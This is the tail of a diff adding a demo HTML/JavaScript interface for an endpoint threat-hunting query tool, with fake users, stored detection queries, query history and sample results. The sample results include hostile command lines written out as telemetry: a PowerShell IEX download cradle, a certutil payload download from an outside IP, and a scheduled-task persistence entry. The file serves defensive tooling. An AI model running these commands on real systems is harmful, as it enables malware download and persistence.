+            <div class="flex justify-between mt-lg">
+              <button class="btn" onclick="wizardNext(1)">&#8592; Back</button>
+              <button class="btn btn-primary" onclick="wizardNext(3)">Next: Sessions &#8594;</button>
+            </div>
+          </div>
+
+          <!-- Step 3: Sessions -->
+          <div class="wizard-content hidden" id="wizard-step-3">
+            <h3 style="font-size:1rem;margin-bottom:16px">Session Timeout</h3>
+            <div class="form-group mb-md">
+              <label>Inactivity Timeout</label>
+              <select style="width:200px">
+                <option>30 minutes</option>
+                <option>1 hour</option>
+                <option>4 hours</option>
+                <option selected>8 hours</option>
+                <option>24 hours</option>
+              </select>
+              <span class="text-sm text-muted mt-sm">Users will be logged out after this period of inactivity</span>
+            </div>
+            <div class="flex justify-between mt-lg">
+              <button class="btn" onclick="wizardNext(2)">&#8592; Back</button>
+              <button class="btn btn-primary" onclick="wizardNext(4)">Next: Passwords &#8594;</button>
+            </div>
+          </div>
+
+          <!-- Step 4: Password Policy -->
+          <div class="wizard-content hidden" id="wizard-step-4">
+            <h3 style="font-size:1rem;margin-bottom:16px">Password Policy</h3>
+            <div class="form-group mb-md">
+              <label>Minimum Length</label>
+              <input type="number" value="8" min="6" max="32" style="width:100px">
+            </div>
+            <div class="mb-md" style="display:flex;flex-direction:column;gap:8px">
+              <label style="display:flex;align-items:center;gap:8px;font-weight:400">
+                <input type="checkbox" checked> Require uppercase letter
+              </label>
+              <label style="display:flex;align-items:center;gap:8px;font-weight:400">
+                <input type="checkbox" checked> Require lowercase letter
+              </label>
+              <label style="display:flex;align-items:center;gap:8px;font-weight:400">
+                <input type="checkbox" checked> Require number
+              </label>
+              <label style="display:flex;align-items:center;gap:8px;font-weight:400">
+                <input type="checkbox"> Require special character
+              </label>
+            </div>
+            <div class="flex justify-between mt-lg">
+              <button class="btn" onclick="wizardNext(3)">&#8592; Back</button>
+              <button class="btn btn-primary" onclick="wizardNext(5)">Next: Retention &#8594;</button>
+            </div>
+          </div>
+
+          <!-- Step 5: Retention -->
+          <div class="wizard-content hidden" id="wizard-step-5">
+            <h3 style="font-size:1rem;margin-bottom:16px">Query Result Retention</h3>
+            <div class="form-group mb-md">
+              <label>Retention Period</label>
+              <select style="width:200px">
+                <option>No auto-expiration</option>
+                <option>30 days</option>
+                <option selected>90 days</option>
+                <option>180 days</option>
+                <option>365 days</option>
+              </select>
+              <span class="text-sm text-muted mt-sm">Results older than this will be automatically removed</span>
+            </div>
+            <div class="flex justify-between mt-lg">
+              <button class="btn" onclick="wizardNext(4)">&#8592; Back</button>
+              <button class="btn btn-success" onclick="showToast('Settings saved successfully','success')">Save All Settings &#10003;</button>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ==================== MODALS ==================== -->
+
+<!-- Create User Modal -->
+<div id="modal-create-user" class="modal-overlay hidden" onclick="closeModalOnOverlay(event,'modal-create-user')">
+  <div class="modal">
+    <h3>Create New User</h3>
+    <div class="form-group mb-md">
+      <label>Username</label>
+      <input type="text" placeholder="e.g. jsmith" style="width:100%">
+    </div>
+    <div class="form-group mb-md">
+      <label>Full Name</label>
+      <input type="text" placeholder="e.g. Jane Smith" style="width:100%">
+    </div>
+    <div class="form-group mb-md">
+      <label>Role</label>
+      <select style="width:100%">
+        <option value="standard">Standard User</option>
+        <option value="admin">Admin</option>
+      </select>
+    </div>
+    <div class="form-group mb-md">
+      <label>Temporary Password</label>
+      <input type="text" value="changeme123" style="width:100%">
+      <span class="text-sm text-muted">User will be forced to change on first login</span>
+    </div>
+    <div class="modal-actions">
+      <button class="btn" onclick="closeModal('modal-create-user')">Cancel</button>
+      <button class="btn btn-primary" onclick="closeModal('modal-create-user');showToast('User created successfully','success')">Create User</button>
+    </div>
+  </div>
+</div>
+
+<!-- Create Stored Query Modal -->
+<div id="modal-create-query" class="modal-overlay hidden" onclick="closeModalOnOverlay(event,'modal-create-query')">
+  <div class="modal" style="max-width:650px">
+    <h3>Create Stored Query</h3>
+    <div class="form-row mb-md">
+      <div class="form-group">
+        <label>Query Name</label>
+        <input type="text" placeholder="e.g. Find Suspicious Process" style="width:100%">
+      </div>
+      <div class="form-group">
+        <label>Category</label>
+        <select style="width:100%">
+          <option>Process</option><option>Network</option><option>Malware</option>
+          <option>Persistence</option><option>File</option><option>Registry</option>
+        </select>
+      </div>
+    </div>
+    <div class="form-group mb-md">
+      <label>Description</label>
+      <textarea rows="2" placeholder="Brief description of what this query does..." style="width:100%"></textarea>
+    </div>
+    <div class="form-group mb-md">
+      <label>Deep Visibility Query</label>
+      <textarea rows="3" placeholder='e.g. ObjectType = "process" AND ProcessName contains "{process_name}"' style="width:100%;font-family:var(--font-mono);font-size:0.8rem"></textarea>
+    </div>
+    <div class="form-group mb-md">
+      <label>Parameters</label>
+      <div class="text-sm text-muted mb-md">Define placeholders that users fill in when running this query</div>
+      <div style="border:1px solid var(--border);border-radius:var(--radius);padding:12px">
+        <div class="flex gap-sm items-center mb-md">
+          <input type="text" placeholder="Parameter name" style="flex:1">
+          <select style="width:130px">
+            <option>Text</option><option>Date/Time</option><option>Dropdown</option>
+          </select>
+          <button class="btn btn-sm">+ Add</button>
+        </div>
+        <div class="text-sm text-muted">No parameters added yet. Use {param_name} syntax in the query string.</div>
+      </div>
+    </div>
+    <div class="modal-actions">
+      <button class="btn" onclick="closeModal('modal-create-query')">Cancel</button>
+      <button class="btn btn-primary" onclick="closeModal('modal-create-query');showToast('Query created successfully','success')">Create Query</button>
+    </div>
+  </div>
+</div>
+
+<!-- Toast Container -->
+<div class="toast-container" id="toast-container"></div>
+
+<script>
+// ===== FAKE DATA =====
+
+const FAKE_USERS = [
+  { username: 'admin', fullName: 'Administrator', role: 'Admin', status: 'active', created: '2026-01-15', lastLogin: '2026-03-13 09:14', forcePasswordChange: false },
+  { username: 'jmartinez', fullName: 'Jessica Martinez', role: 'Admin', status: 'active', created: '2026-01-20', lastLogin: '2026-03-13 08:45', forcePasswordChange: false },
+  { username: 'tchang', fullName: 'Tyler Chang', role: 'Standard', status: 'active', created: '2026-02-01', lastLogin: '2026-03-12 17:32', forcePasswordChange: false },
+  { username: 'kpatel', fullName: 'Kavita Patel', role: 'Standard', status: 'active', created: '2026-02-01', lastLogin: '2026-03-13 07:58', forcePasswordChange: false },
+  { username: 'rwilson', fullName: 'Robert Wilson', role: 'Standard', status: 'active', created: '2026-02-10', lastLogin: '2026-03-11 14:20', forcePasswordChange: false },
+  { username: 'snakamura', fullName: 'Saki Nakamura', role: 'Standard', status: 'active', created: '2026-02-15', lastLogin: '2026-03-13 09:01', forcePasswordChange: false },
+  { username: 'dbrooks', fullName: 'Derek Brooks', role: 'Standard', status: 'inactive', created: '2026-02-05', lastLogin: '2026-02-28 11:45', forcePasswordChange: false },
+];
+
+const FAKE_STORED_QUERIES = [
+  {
+    id: 1, name: 'Suspicious Process by Hostname', category: 'Process',
+    description: 'Search for processes matching a pattern on a specific endpoint. Useful for investigating suspicious activity on known compromised hosts.',
+    dvQuery: 'ObjectType = "process" AND EndpointName = "{hostname}" AND ProcessName contains "{process_name}"',
+    params: [
+      { name: 'hostname', label: 'Hostname', type: 'text', placeholder: 'e.g. WORKSTATION-042' },
+      { name: 'process_name', label: 'Process Name', type: 'text', placeholder: 'e.g. powershell' }
+    ],
+    createdBy: 'admin', created: '2026-01-20', modified: '2026-02-15'
+  },
+  {
+    id: 2, name: 'Network Connections to External IP', category: 'Network',
+    description: 'Find all network connections to a specific external IP address across all endpoints. Helps identify potential C2 communication.',
+    dvQuery: 'ObjectType = "ip" AND DstIP = "{target_ip}" AND EventTime >= "{start_time}"',
+    params: [
+      { name: 'target_ip', label: 'Destination IP', type: 'text', placeholder: 'e.g. 185.220.101.42' },
+      { name: 'start_time', label: 'Start Time', type: 'datetime', placeholder: '' }
+    ],
+    createdBy: 'admin', created: '2026-01-22', modified: '2026-03-01'
+  },
+  {
+    id: 3, name: 'File Hash Lookup', category: 'Malware',
+    description: 'Search for a specific file hash (SHA256) across all monitored endpoints to determine scope of a known malicious file.',
+    dvQuery: 'ObjectType = "file" AND FileSHA256 = "{sha256_hash}"',
+    params: [
+      { name: 'sha256_hash', label: 'SHA256 Hash', type: 'text', placeholder: 'e.g. a1b2c3d4e5f6...' }
+    ],
+    createdBy: 'jmartinez', created: '2026-02-01', modified: '2026-02-01'
+  },
+  {
+    id: 4, name: 'Persistence Mechanisms', category: 'Persistence',
+    description: 'Detect registry modifications and scheduled tasks created within a time window that may indicate persistence mechanisms.',
+    dvQuery: 'ObjectType = "registry" OR ObjectType = "scheduled_task" AND EventTime BETWEEN "{start_time}" AND "{end_time}" AND EndpointOS = "{os_type}"',
+    params: [
+      { name: 'start_time', label: 'Start Time', type: 'datetime', placeholder: '' },
+      { name: 'end_time', label: 'End Time', type: 'datetime', placeholder: '' },
+      { name: 'os_type', label: 'Operating System', type: 'dropdown', options: ['Windows', 'Linux', 'macOS'] }
+    ],
+    createdBy: 'admin', created: '2026-02-05', modified: '2026-03-10'
+  },
+  {
+    id: 5, name: 'DNS Query to Suspicious Domain', category: 'Network',
+    description: 'Identify endpoints that resolved a specific domain name. Useful for threat hunting after receiving IOCs from threat intel feeds.',
+    dvQuery: 'ObjectType = "dns" AND DNSRequest contains "{domain}"',
+    params: [
+      { name: 'domain', label: 'Domain', type: 'text', placeholder: 'e.g. evil-domain.xyz' }
+    ],
+    createdBy: 'jmartinez', created: '2026-02-10', modified: '2026-02-10'
+  },
+  {
+    id: 6, name: 'PowerShell Encoded Commands', category: 'Process',
+    description: 'Find PowerShell executions with encoded command-line arguments, a common technique for obfuscating malicious scripts.',
+    dvQuery: 'ObjectType = "process" AND ProcessName = "powershell.exe" AND ProcessCmdLine contains "-enc" AND EventTime >= "{start_time}"',
+    params: [
+      { name: 'start_time', label: 'Since', type: 'datetime', placeholder: '' }
+    ],
+    createdBy: 'admin', created: '2026-02-12', modified: '2026-02-28'
+  },
+  {
+    id: 7, name: 'Lateral Movement Detection', category: 'Network',
+    description: 'Detect potential lateral movement by searching for remote service creation, PsExec usage, and WMI remote execution.',
+    dvQuery: 'ObjectType = "process" AND (ProcessName = "psexec.exe" OR ProcessName = "wmic.exe" OR ProcessName = "winrm.cmd") AND SrcEndpoint = "{source_host}"',
+    params: [
+      { name: 'source_host', label: 'Source Hostname', type: 'text', placeholder: 'e.g. DC-PRIMARY' }
+    ],
+    createdBy: 'jmartinez', created: '2026-02-20', modified: '2026-03-05'
+  },
+  {
+    id: 8, name: 'File Writes to Temp Directories', category: 'File',
+    description: 'Search for file creation events in temporary directories, which malware commonly uses for staging payloads.',
+    dvQuery: 'ObjectType = "file" AND EventType = "File Creation" AND (FilePath contains "\\Temp\\" OR FilePath contains "/tmp/") AND EndpointName = "{hostname}"',
+    params: [
+      { name: 'hostname', label: 'Hostname', type: 'text', placeholder: 'e.g. WORKSTATION-042' }
+    ],
+    createdBy: 'admin', created: '2026-03-01', modified: '2026-03-01'
+  }
+];
+
+const FAKE_RESULTS = [
+  { EventTime: '2026-03-13 08:42:17', EndpointName: 'WORKSTATION-042', SiteName: 'US-East-HQ', ProcessName: 'powershell.exe', ProcessCmdLine: 'powershell.exe -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://10.0.5.23/stage2.ps1\')"', PID: 7842, ParentProcess: 'cmd.exe', ParentPID: 3201, User: 'CORP\\jdoe', SHA256: 'a3f2b8c1d4e5f67890abcdef1234567890abcdef1234567890abcdef12345678', ThreatStatus: 'Suspicious', AgentVersion: '23.4.1.185' },
+  { EventTime: '2026-03-13 08:41:53', EndpointName: 'WORKSTATION-042', SiteName: 'US-East-HQ', ProcessName: 'powershell.exe', ProcessCmdLine: 'powershell.exe -ep bypass -file C:\\Users\\jdoe\\AppData\\Local\\Temp\\update.ps1', PID: 7838, ParentProcess: 'explorer.exe', ParentPID: 2104, User: 'CORP\\jdoe', SHA256: 'a3f2b8c1d4e5f67890abcdef1234567890abcdef1234567890abcdef12345678', ThreatStatus: 'Suspicious', AgentVersion: '23.4.1.185' },
+  { EventTime: '2026-03-13 08:35:02', EndpointName: 'WORKSTATION-042', SiteName: 'US-East-HQ', ProcessName: 'cmd.exe', ProcessCmdLine: 'cmd.exe /c whoami /priv', PID: 7801, ParentProcess: 'powershell.exe', ParentPID: 7795, User: 'CORP\\jdoe', SHA256: 'b12c34d56e78f90a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4', ThreatStatus: 'Malicious', AgentVersion: '23.4.1.185' },
+  { EventTime: '2026-03-13 08:34:48', EndpointName: 'WORKSTATION-042', SiteName: 'US-East-HQ', ProcessName: 'net.exe', ProcessCmdLine: 'net.exe user /domain', PID: 7798, ParentProcess: 'powershell.exe', ParentPID: 7795, User: 'CORP\\jdoe', SHA256: 'c23d45e67f89a01b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5', ThreatStatus: 'Suspicious', AgentVersion: '23.4.1.185' },
+  { EventTime: '2026-03-13 08:30:11', EndpointName: 'WORKSTATION-042', SiteName: 'US-East-HQ', ProcessName: 'certutil.exe', ProcessCmdLine: 'certutil.exe -urlcache -split -f http://185.220.101.42/payload.bin C:\\Users\\Public\\payload.bin', PID: 7782, ParentProcess: 'cmd.exe', ParentPID: 7770, User: 'CORP\\jdoe', SHA256: 'd34e56f78a90b12c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6', ThreatStatus: 'Malicious', AgentVersion: '23.4.1.185' },
+  { EventTime: '2026-03-13 08:22:05', EndpointName: 'WORKSTATION-042', SiteName: 'US-East-HQ', ProcessName: 'schtasks.exe', ProcessCmdLine: 'schtasks.exe /create /tn "WindowsUpdate" /tr "C:\\Users\\Public\\payload.bin" /sc onlogon /ru SYSTEM', PID: 7755, ParentProcess: 'cmd.exe', ParentPID: 7750, User: 'CORP\\jdoe', SHA256: 'e45f67a89b01c23d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7', ThreatStatus: 'Malicious', AgentVersion: '23.4.1.185' },
+  { EventTime: '2026-03-13 07:55:33', EndpointName: 'WORKSTATION-042', SiteName: 'US-East-HQ', ProcessName: 'chrome.exe', ProcessCmdLine: 'chrome.exe --restore-last-session', PID: 7610, ParentProcess: 'explorer.exe', ParentPID: 2104, User: 'CORP\\jdoe', SHA256: 'f56a78b90c12d34e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8', ThreatStatus: 'Benign', AgentVersion: '23.4.1.185' },
+  { EventTime: '2026-03-13 07:55:01', EndpointName: 'WORKSTATION-042', SiteName: 'US-East-HQ', ProcessName: 'explorer.exe', ProcessCmdLine: 'C:\\Windows\\explorer.exe', PID: 2104, ParentProcess: 'userinit.exe', ParentPID: 1980, User: 'CORP\\jdoe', SHA256: 'a67b89c01d23e45f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9', ThreatStatus: 'Benign', AgentVersion: '23.4.1.185' },
+];
+
+const FAKE_HISTORY = [
+  { id: 1, queryName: 'Suspicious Process by Hostname', category: 'Process', params: 'hostname=WORKSTATION-042, process_name=powershell', user: 'admin', time: '2026-03-13 09:15', status: 'success', shared: true, resultCount: 8 },
+  { id: 2, queryName: 'Network Connections to External IP', category: 'Network', params: 'target_ip=185.220.101.42', user: 'kpatel', time: '2026-03-13 08:50', status: 'success', shared: true, resultCount: 23 },
+  { id: 3, queryName: 'File Hash Lookup', category: 'Malware', params: 'sha256=a3f2b8c1d4...', user: 'admin', time: '2026-03-13 08:30', status: 'success', shared: false, resultCount: 3 },
+  { id: 4, queryName: 'PowerShell Encoded Commands', category: 'Process', params: 'start_time=2026-03-12', user: 'tchang', time: '2026-03-13 08:15', status: 'success', shared: true, resultCount: 47 },
+  { id: 5, queryName: 'DNS Query to Suspicious Domain', category: 'Network', params: 'domain=evil-c2-server.xyz', user: 'snakamura', time: '2026-03-12 16:40', status: 'success', shared: false, resultCount: 12 },
+  { id: 6, queryName: 'Persistence Mechanisms', category: 'Persistence', params: 'os_type=Windows, start=03-11, end=03-12', user: 'admin', time: '2026-03-12 14:20', status: 'success', shared: true, resultCount: 89 },
+  { id: 7, queryName: 'Lateral Movement Detection', category: 'Network', params: 'source_host=DC-PRIMARY', user: 'rwilson', time: '2026-03-12 11:05', status: 'error', shared: false, resultCount: 0 },
+  { id: 8, queryName: 'File Writes to Temp Directories', category: 'File', params: 'hostname=SERVER-DB01', user: 'kpatel', time: '2026-03-12 10:30', status: 'success', shared: false, resultCount: 156 },
+  { id: 9, queryName: 'Suspicious Process by Hostname', category: 'Process', params: 'hostname=LAPTOP-EXEC03, process_name=mshta', user: 'tchang', time: '2026-03-11 15:42', status: 'success', shared: true, resultCount: 5 },
+  { id: 10, queryName: 'Network Connections to External IP', category: 'Network', params: 'target_ip=91.215.85.17', user: 'snakamura', time: '2026-03-11 13:18', status: 'success', shared: false, resultCount: 8 },
+];
+
+// ===== STATE =====
+let currentUser = null;
+let selectedQuery = null;
+let currentResults = [...FAKE_RESULTS];
+let sortCol = null;
+let sortAsc = true;
+
+// ===== LOGIN =====
+function handleLogin() {
+  const user = document.getElementById('login-user').value;
+  const pass = document.getElementById('login-pass').value;
+  const found = FAKE_USERS.find(u => u.username === user);
+  if (!found || pass === '') {
+    document.getElementById('login-error').classList.remove('hidden');
+    return;
+  }
+  currentUser = found;
+  if (user === 'admin' && pass === 'admin') {
+    document.getElementById('login-screen').style.display = 'none';
+    document.getElementById('password-change-screen').style.display = 'flex';
+    return;
+  }
+  enterApp();
+}
+
+function handlePasswordChange() {
+  const p1 = document.getElementById('new-pass-1').value;
+  const p2 = document.getElementById('new-pass-2').value;
+  if (p1.length < 8) { showToast('Password must be at least 8 characters', 'error'); return; }
+  if (p1 !== p2) { showToast('Passwords do not match', 'error'); return; }
+  document.getElementById('password-change-screen').style.display = 'none';
+  enterApp();
+}
+
+function enterApp() {
+  document.getElementById('login-screen').style.display = 'none';
+  document.getElementById('password-change-screen').style.display = 'none';
+  document.getElementById('app-shell').style.display = 'block';
+  document.getElementById('user-avatar').textContent = currentUser.fullName[0];
+  document.getElementById('user-display-name').textContent = currentUser.username;
+  document.getElementById('dropdown-fullname').textContent = currentUser.fullName;
+  document.getElementById('dropdown-role').textContent = currentUser.role;
+  if (currentUser.role !== 'Admin') {
+    document.getElementById('admin-nav-link').classList.add('hidden');
+  }
+  renderQueryList();
+  renderHistory();
+  renderAdminUsers();
+  renderAdminQueries();
+}
+
+function handleLogout() {
+  document.getElementById('app-shell').style.display = 'none';
+  document.getElementById('login-screen').style.display = 'flex';
+  document.getElementById('login-pass').value = '';
+  document.getElementById('login-error').classList.add('hidden');
+  currentUser = null;
+}
+
+// ===== NAVIGATION =====
+function showPage(page) {
+  document.querySelectorAll('.topnav-links a').forEach(a => a.classList.remove('active'));
+  document.querySelector(`.topnav-links a[data-page="${page}"]`).classList.add('active');
+  document.getElementById('page-query-exec').classList.add('hidden');
+  document.getElementById('page-history').classList.add('hidden');
+  document.getElementById('page-admin').classList.add('hidden');
+  document.getElementById('page-' + page).classList.remove('hidden');
+  return false;
+}
+
+function showAdminTab(tab) {
+  document.querySelectorAll('.admin-sidebar a').forEach(a => a.classList.remove('active'));
+  document.querySelector(`.admin-sidebar a[data-admin="${tab}"]`).classList.add('active');
+  ['users', 'queries', 'history-mgmt', 'disk', 'wizard'].forEach(t => {
+    const el = document.getElementById('admin-' + t);
+    if (el) el.classList.add('hidden');
+  });
+  document.getElementById('admin-' + tab).classList.remove('hidden');
+  return false;
+}
+
+// ===== THEME =====
+function toggleTheme() {
+  const html = document.documentElement;
+  const current = html.getAttribute('data-theme');
+  const next = current === 'dark' ? 'light' : 'dark';
+  html.setAttribute('data-theme', next);
+  document.getElementById('theme-icon').innerHTML = next === 'dark' ? '&#9788;' : '&#9790;';
+}
+
+// ===== USER MENU =====
+function toggleUserMenu(e) {
+  e.stopPropagation();
+  document.getElementById('user-dropdown').classList.toggle('show');
+}
+document.addEventListener('click', () => {
+  document.getElementById('user-dropdown')?.classList.remove('show');
+  document.getElementById('export-menu')?.classList.remove('show');
+});
+
+// ===== QUERY EXECUTION =====
+function renderQueryList(filterCat) {
+  const categories = [...new Set(FAKE_STORED_QUERIES.map(q => q.category))];
+  const filterEl = document.getElementById('category-filter');
+  filterEl.innerHTML = `<button class="${!filterCat ? 'active' : ''}" onclick="renderQueryList()">All</button>` +
+    categories.map(c => `<button class="${filterCat === c ? 'active' : ''}" onclick="renderQueryList('${c}')">${c}</button>`).join('');
+
+  const queries = filterCat ? FAKE_STORED_QUERIES.filter(q => q.category === filterCat) : FAKE_STORED_QUERIES;
+  const listEl = document.getElementById('query-list');
+  listEl.innerHTML = queries.map(q => `
+    <div class="query-card ${selectedQuery?.id === q.id ? 'selected' : ''}" onclick="selectQuery(${q.id})">
+      <div class="query-card-title">${q.name}</div>
+      <div class="query-card-desc">${q.description.substring(0, 80)}...</div>
+      <div class="query-card-meta">
+        <span class="badge badge-info">${q.category}</span>
+        <span class="badge badge-muted">${q.params.length} param${q.params.length !== 1 ? 's' : ''}</span>
+      </div>
+    </div>
+  `).join('');
+}
+
+function selectQuery(id) {
+  selectedQuery = FAKE_STORED_QUERIES.find(q => q.id === id);
+  renderQueryList(document.querySelector('.category-filter button.active:not(:first-child)')?.textContent);
+  renderQueryDetail();
+}
+
+function renderQueryDetail() {
+  if (!selectedQuery) return;
+  const q = selectedQuery;
+  const detailEl = document.getElementById('query-detail');
+  let paramsHtml = q.params.map(p => {
+    let input = '';
+    if (p.type === 'text') {
+      input = `<input type="text" placeholder="${p.placeholder}" style="width:100%">`;
+    } else if (p.type === 'datetime') {
+      input = `<input type="datetime-local" style="width:100%">`;
+    } else if (p.type === 'dropdown') {
+      input = `<select style="width:100%">${p.options.map(o => `<option>${o}</option>`).join('')}</select>`;
+    }
+    return `<div class="param-field form-group">
+      <label>${p.label} <span class="param-type">(${p.type})</span></label>
+      ${input}
+    </div>`;
+  }).join('');
+
+  detailEl.innerHTML = `
+    <div class="card-header">${q.name}</div>
+    <p class="text-sm text-muted mb-md">${q.description}</p>
+    <div style="background:var(--bg-primary);padding:10px 14px;border-radius:var(--radius);font-family:var(--font-mono);font-size:0.8rem;margin-bottom:20px;overflow-x:auto;border:1px solid var(--border)">
+      ${q.dvQuery}
+    </div>
+    <div class="param-form">
+      ${paramsHtml}
+      <button class="btn btn-primary" onclick="runQuery()">&#9654; Run Query</button>
+    </div>
+  `;
+}
+
+function runQuery() {
+  document.getElementById('results-area').classList.add('hidden');
+  document.getElementById('query-loading').classList.remove('hidden');
+  setTimeout(() => {
+    document.getElementById('query-loading').classList.add('hidden');
+    document.getElementById('results-area').classList.remove('hidden');
+    currentResults = [...FAKE_RESULTS];
+    renderResults();
+    showToast('Query completed — ' + FAKE_RESULTS.length + ' results returned', 'success');
+  }, 2000);
+}
+
+// ===== RESULTS TABLE =====
+function renderResults() {
+  if (currentResults.length === 0) return;
+  const cols = Object.keys(currentResults[0]);
+  const thead = document.getElementById('results-thead');
+  const tbody = document.getElementById('results-tbody');
+  document.getElementById('results-meta').textContent = `${currentResults.length} results`;
+
+  thead.innerHTML = '<tr>' + cols.map(c =>
+    `<th onclick="sortResults('${c}')">${c} <span class="sort-arrow">${sortCol === c ? (sortAsc ? '&#9650;' : '&#9660;') : ''}</span></th>`
+  ).join('') + '</tr>';
+
+  tbody.innerHTML = currentResults.map(row =>
+    '<tr>' + cols.map(c => {
+      let val = row[c];
+      let cls = '';
+      if (c === 'ThreatStatus') {
+        if (val === 'Malicious') cls = 'badge badge-danger';
+        else if (val === 'Suspicious') cls = 'badge badge-warning';
+        else cls = 'badge badge-success';
+        return `<td><span class="${cls}">${val}</span></td>`;
+      }
+      if (typeof val === 'string' && val.length > 60) val = val.substring(0, 57) + '...';
+      return `<td title="${row[c]}">${val}</td>`;
+    }).join('') + '</tr>'
+  ).join('');
+}
+
+function sortResults(col) {
+  if (sortCol === col) { sortAsc = !sortAsc; } else { sortCol = col; sortAsc = true; }
+  currentResults.sort((a, b) => {
+    const va = a[col], vb = b[col];
+    if (va < vb) return sortAsc ? -1 : 1;
+    if (va > vb) return sortAsc ? 1 : -1;
+    return 0;
+  });
+  renderResults();
+}
+
+function filterResults() {
+  const term = document.getElementById('results-filter').value.toLowerCase();
+  currentResults = FAKE_RESULTS.filter(row =>
+    Object.values(row).some(v => String(v).toLowerCase().includes(term))
+  );
+  renderResults();
+}
+
+function toggleExportMenu() {
+  event.stopPropagation();
+  document.getElementById('export-menu').classList.toggle('show');
+}
+function exportData(fmt) {
+  document.getElementById('export-menu').classList.remove('show');
+  showToast(`Exported as ${fmt.toUpperCase()} (demo)`, 'info');
+}
+function shareResults() {
+  showToast('Results shared with all users', 'success');
+}
+
+// ===== HISTORY =====
+function renderHistory() {
+  const tbody = document.getElementById('history-tbody');
+  tbody.innerHTML = FAKE_HISTORY.map(h => `
+    <tr>
+      <td style="font-weight:500">${h.queryName}</td>
+      <td><span class="badge badge-info">${h.category}</span></td>
+      <td class="text-sm" title="${h.params}">${h.params.length > 40 ? h.params.substring(0, 37) + '...' : h.params}</td>
+      <td>${h.user}</td>
+      <td>${h.time}</td>
+      <td><span class="badge ${h.status === 'success' ? 'badge-success' : 'badge-danger'}">${h.status}</span></td>
+      <td>${h.shared ? '<span class="badge badge-info">Shared</span>' : '<span class="text-muted">-</span>'}</td>
+      <td>
+        <button class="btn btn-sm" onclick="viewHistoryResults(${h.id})" ${h.status === 'error' ? 'disabled' : ''}>View</button>
+      </td>
+    </tr>
+  `).join('');
+}
+
+function viewHistoryResults(id) {
+  showPage('query-exec');
+  document.getElementById('results-area').classList.remove('hidden');
+  document.getElementById('query-loading').classList.add('hidden');
+  currentResults = [...FAKE_RESULTS];
+  renderResults();
+  showToast('Loaded historical results', 'info');
+}
+
+// ===== ADMIN: USERS =====
+function renderAdminUsers() {
+  const tbody = document.getElementById('admin-users-tbody');
+  tbody.innerHTML = FAKE_USERS.map(u => `
+    <tr>
+      <td style="font-weight:500">${u.username}</td>
+      <td>${u.fullName}</td>
+      <td><span class="badge ${u.role === 'Admin' ? 'badge-warning' : 'badge-info'}">${u.role}</span></td>
+      <td><span class="status-dot ${u.status === 'active' ? 'status-active' : 'status-inactive'}"></span>${u.status === 'active' ? 'Active' : 'Inactive'}</td>
+      <td>${u.created}</td>
+      <td>${u.lastLogin}</td>
+      <td>
+        <div class="flex gap-sm">
+          <button class="btn btn-sm" onclick="showToast('Password reset (demo)','info')">Reset PW</button>
+          <button class="btn btn-sm ${u.status === 'active' ? 'btn-danger' : 'btn-success'}" onclick="showToast('Status toggled (demo)','info')">${u.status === 'active' ? 'Deactivate' : 'Activate'}</button>
+        </div>
+      </td>
+    </tr>
+  `).join('');
+}
+
+// ===== ADMIN: QUERIES =====
+function renderAdminQueries() {
+  const tbody = document.getElementById('admin-queries-tbody');
+  tbody.innerHTML = FAKE_STORED_QUERIES.map(q => `
+    <tr>
+      <td style="font-weight:500">${q.name}</td>
+      <td><span class="badge badge-info">${q.category}</span></td>
+      <td>${q.params.map(p => `<span class="badge badge-muted">${p.label} (${p.type})</span>`).join(' ')}</td>
+      <td>${q.createdBy}</td>
+      <td>${q.modified}</td>
+      <td>
+        <div class="flex gap-sm">
+          <button class="btn btn-sm" onclick="showToast('Edit query (demo)','info')">Edit</button>
+          <button class="btn btn-sm btn-danger" onclick="showToast('Query deleted (demo)','info')">Delete</button>
+        </div>
+      </td>
+    </tr>
+  `).join('');
+}
+
+// ===== WIZARD =====
+function wizardNext(step) {
+  for (let i = 1; i <= 5; i++) {
+    document.getElementById('wizard-step-' + i).classList.add('hidden');
+    const stepEl = document.querySelector(`.wizard-step[data-step="${i}"]`);
+    stepEl.classList.remove('active', 'completed');
+    if (i < step) stepEl.classList.add('completed');
+    if (i === step) stepEl.classList.add('active');
+  }
+  document.getElementById('wizard-step-' + step).classList.remove('hidden');
+}
+
+// ===== MODALS =====
+function openModal(type) {
+  document.getElementById('modal-' + type).classList.remove('hidden');
+}
+function closeModal(id) {
+  document.getElementById(id).classList.add('hidden');
+}
+function closeModalOnOverlay(e, id) {
+  if (e.target.id === id) closeModal(id);
+}
+
+// ===== TOAST =====
+function showToast(message, type) {
+  const container = document.getElementById('toast-container');
+  const toast = document.createElement('div');
+  toast.className = 'toast toast-' + type;
+  toast.innerHTML = message;
+  container.appendChild(toast);
+  setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 300); }, 3000);
+}
+
+// ===== KEYBOARD SHORTCUTS =====
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'Enter' && document.getElementById('login-screen').style.display !== 'none') {
+    handleLogin();
+  }
+});
+
+// ===== INIT: auto-focus login =====
+document.getElementById('login-user').focus();
+</script>
+</body>
+</html>
